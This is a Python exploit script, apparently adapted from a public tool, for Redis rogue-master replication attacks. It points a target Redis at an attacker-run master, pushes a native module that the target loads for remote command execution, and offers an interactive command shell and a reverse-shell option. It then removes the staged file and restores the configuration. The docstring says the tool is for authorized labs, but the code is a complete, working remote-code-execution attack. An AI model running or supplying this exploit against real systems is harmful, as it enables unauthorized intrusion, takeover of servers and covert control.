#!/usr/bin/env python3
"""Redis rogue replication server for authorized, disposable labs.

Derived from n0b0dyCN/redis-rogue-server (Apache-2.0). Changes by Zhaoyi Fan:
framed RESP, checked replies, listener-first setup, a locally built module,
unique staging filenames, timeouts, and best-effort configuration restoration.
"""

import argparse
from pathlib import Path
import secrets
import socket
import sys
import time


class RedisError(RuntimeError):
    pass


def encode_command(*args):
    frame = [f"*{len(args)}\r\n".encode("ascii")]
    for arg in args:
        data = str(arg).encode("utf-8")
        frame.extend((b"$" + str(len(data)).encode("ascii") + b"\r\n", data, b"\r\n"))
    return b"".join(frame)


def line(reader):
    data = reader.readline(65537)
    if not data or len(data) > 65536 or not data.endswith(b"\r\n"):
        raise RedisError("Incomplete or oversized protocol line")
    return data[:-2]


def reply(reader):
    data = line(reader)
    kind, value = data[:1], data[1:]
    if kind == b"+":
        return value.decode("utf-8", "replace")
    if kind == b"-":
        raise RedisError(value.decode("utf-8", "replace"))
    if kind == b":":
        return int(value)
    if kind in (b"$", b"*"):
        size = int(value)
        if size == -1:
            return None
        if size < 0 or size > 16 * 1024 * 1024:
            raise RedisError("Invalid or excessive reply length")
        if kind == b"*":
            return [reply(reader) for _ in range(size)]
        result = reader.read(size)
        if len(result) != size or reader.read(2) != b"\r\n":
            raise RedisError("Truncated bulk reply")
        return result.decode("utf-8", "replace")
    raise RedisError(f"Unexpected reply type: {kind!r}")


class RedisClient:
    def __init__(self, host, port, password, verbose):
        self.sock = socket.create_connection((host, port), timeout=15)
        self.sock.settimeout(15)
        self.reader = self.sock.makefile("rb")
        self.verbose = verbose
        if password is not None:
            self.command("AUTH", password, hide=True)

    def command(self, *args, hide=False):
        if self.verbose:
            shown = "[redacted]" if hide else " ".join(map(str, args[1:]))
            print(f"[redis] {args[0]} {shown}", flush=True)
        self.sock.sendall(encode_command(*args))
        result = reply(self.reader)
        if self.verbose:
            print(f"[reply] {result!r}", flush=True)
        return result

    def close(self):
        self.reader.close()
        self.sock.close()


def replication_command(reader):
    header = line(reader)
    if not header.startswith(b"*"):
        return header.decode("ascii", "replace").split()
    count = int(header[1:])
    if not 1 <= count <= 16:
        raise RedisError("Invalid replication command")
    args = []
    for _ in range(count):
        bulk = line(reader)
        if not bulk.startswith(b"$"):
            raise RedisError("Invalid replication argument")
        size = int(bulk[1:])
        if not 0 <= size <= 4096:
            raise RedisError("Invalid replication argument length")
        data = reader.read(size)
        if len(data) != size or reader.read(2) != b"\r\n":
            raise RedisError("Truncated replication argument")
        args.append(data.decode("ascii", "replace"))
    return args


class RogueMaster:
    def __init__(self, host, port, payload):
        self.payload = payload
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            self.sock.bind((host, port))
            self.sock.listen(1)
            self.sock.settimeout(30)
        except Exception:
            self.sock.close()
            raise

    def serve(self):
        print("[info] Waiting for target replica (30 s)", flush=True)
        connection, _ = self.sock.accept()
        with connection:
            connection.settimeout(20)
            with connection.makefile("rb") as reader:
                while True:
                    args = replication_command(reader)
                    if not args:
                        raise RedisError("Empty replication command")
                    verb = args[0].upper()
                    if verb == "PING":
                        connection.sendall(b"+PONG\r\n")
                    elif verb == "REPLCONF":
                        connection.sendall(b"+OK\r\n")
                    elif verb in ("PSYNC", "SYNC"):
                        if verb == "PSYNC":
                            connection.sendall(b"+FULLRESYNC " + b"Z" * 40 + b" 1\r\n")
                        connection.sendall(b"$" + str(len(self.payload)).encode("ascii") + b"\r\n")
                        connection.sendall(self.payload + b"\r\n")
                        print(f"[info] Sent {len(self.payload)} module bytes", flush=True)
                        return
                    else:
                        raise RedisError(f"Unexpected replication command: {verb}")

    def close(self):
        self.sock.close()


def config(client, name):
    value = client.command("CONFIG", "GET", name)
    if not isinstance(value, list) or len(value) != 2 or value[0] != name:
        raise RedisError(f"Could not read CONFIG GET {name}: {value!r}")
    return value[1]


def checked(client, *args):
    value = client.command(*args)
    if value != "OK":
        raise RedisError(f"{args[0]} {args[1]} returned {value!r}")


def interactive(client):
    print("[info] Each command runs separately; enter 'exit' to return")
    while True:
        command = input("[<<] ").strip()
        if command == "exit":
            return
        if command:
            output = client.command("system.exec", command)
            print(f"[>>] {output if output else '(no stdout)'}")


def reverse(client):
    host = input("Listener IPv4: ").strip()
    port = int(input("Listener port: ").strip())
    socket.inet_pton(socket.AF_INET, host)
    if not 1 <= port <= 65535:
        raise ValueError("Listener port must be 1..65535")
    checked(client, "system.rev", host, str(port))
    print("[info] Request accepted; verify the connection at your listener")


def run(args):
    path = Path(args.exp).expanduser().resolve()
    payload = path.read_bytes()
    if not payload.startswith(b"\x7fELF"):
        raise ValueError(f"{path} is not an ELF module; run make on Linux")
    if not args.directory.startswith("/") or args.directory == "/":
        raise ValueError("--dir must be an absolute writable target directory other than /")
    client = RedisClient(args.rhost, args.rport, args.passwd, args.verbose)
    changed = {"dir": False, "dbfilename": False, "replica": False, "module": False}
    cleanup_errors = []
    failure = None
    master = None
    original_dir = original_filename = None
    staged = f"rogue-{secrets.token_hex(8)}.so"
    try:
        if client.command("PING") != "PONG":
            raise RedisError("Target did not reply PONG")
        original_dir = config(client, "dir")
        original_filename = config(client, "dbfilename")
        if "role:master" not in client.command("INFO", "replication"):
            raise RedisError("Target is already a replica")
        modules = client.command("MODULE", "LIST")
        if any(isinstance(item, list) and "system" in item for item in modules):
            raise RedisError("The system module is already loaded")
        print(f"[info] Original dir={original_dir}, dbfilename={original_filename}")

        master = RogueMaster(args.lhost, args.lport, payload)
        print(f"[info] Listening at {args.lhost}:{args.lport}")
        if args.directory != original_dir:
            changed["dir"] = True
            checked(client, "CONFIG", "SET", "dir", args.directory)
        changed["dbfilename"] = True
        checked(client, "CONFIG", "SET", "dbfilename", staged)
        changed["replica"] = True
        checked(client, "SLAVEOF", args.lhost, str(args.lport))
        master.serve()
        master.close()
        master = None

        last_error = None
        for attempt in range(6):
            try:
                checked(client, "MODULE", "LOAD", f"./{staged}")
                changed["module"] = True
                print("[info] MODULE LOAD: OK")
                break
            except RedisError as exc:
                last_error = exc
                if attempt < 5:
                    time.sleep(1)
        if not changed["module"]:
            raise RedisError(f"MODULE LOAD failed after replication: {last_error}")

        checked(client, "SLAVEOF", "NO", "ONE")
        changed["replica"] = False
        checked(client, "CONFIG", "SET", "dbfilename", original_filename)
        changed["dbfilename"] = False
        removed = client.command("system.exec",
                                 f"rm -f -- ./{staged} && test ! -e ./{staged} && printf removed")
        if removed != "removed":
            raise RedisError("Could not verify staged module removal")
        if changed["dir"]:
            checked(client, "CONFIG", "SET", "dir", original_dir)
            changed["dir"] = False

        if args.command is not None:
            print(client.command("system.exec", args.command))
        else:
            while True:
                choice = input("[i] commands, [r] reverse shell, [q] quit: ").strip().lower()
                if choice == "i":
                    interactive(client)
                elif choice == "r":
                    reverse(client)
                elif choice == "q":
                    break
                else:
                    print("[info] Choose i, r, or q")
    except BaseException as exc:
        failure = exc
    finally:
        if master is not None:
            master.close()
        for active, label, command in (
            (changed["module"], "MODULE UNLOAD", ("MODULE", "UNLOAD", "system")),
            (changed["replica"], "SLAVEOF NO ONE", ("SLAVEOF", "NO", "ONE")),
            (changed["dbfilename"] and original_filename is not None,
             "restore dbfilename", ("CONFIG", "SET", "dbfilename", original_filename)),
            (changed["dir"] and original_dir is not None,
             "restore dir", ("CONFIG", "SET", "dir", original_dir)),
        ):
            if active:
                try:
                    checked(client, *command)
                    print(f"[info] {label}: OK")
                except Exception as exc:
                    cleanup_errors.append(f"{label}: {exc}")
        client.close()
    if cleanup_errors:
        print("[warn] Cleanup incomplete: " + "; ".join(cleanup_errors), file=sys.stderr)
    if failure is not None:
        raise failure
    if cleanup_errors:
        raise RedisError("Cleanup incomplete; inspect ROLE, CONFIG GET and MODULE LIST")


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--rhost", required=True, help="owned lab Redis host")
    parser.add_argument("--rport", type=int, default=6379, help="target Redis port")
    parser.add_argument("--lhost", required=True, help="local IPv4 reachable by target")
    parser.add_argument("--lport", type=int, default=6379, help="rogue master port")
    parser.add_argument("--exp", default=str(Path(__file__).with_name("module.so")),
                        help="locally built ELF module (default: ./module.so)")
    parser.add_argument("--dir", dest="directory", default="/tmp",
                        help="writable target directory (default: /tmp)")
    parser.add_argument("--passwd", help="target Redis password, if configured")
    parser.add_argument("--command", help="run one command and exit")
    parser.add_argument("-v", "--verbose", action="store_true", help="show Redis replies")
    args = parser.parse_args()
    try:
        run(args)
    except KeyboardInterrupt:
        print("\n[info] Interrupted", file=sys.stderr)
        return 130
    except (OSError, RedisError, ValueError) as exc:
        print(f"[error] {exc}", file=sys.stderr)
        return 1
    return 0


if __name__ == "__main__":
    sys.exit(main())
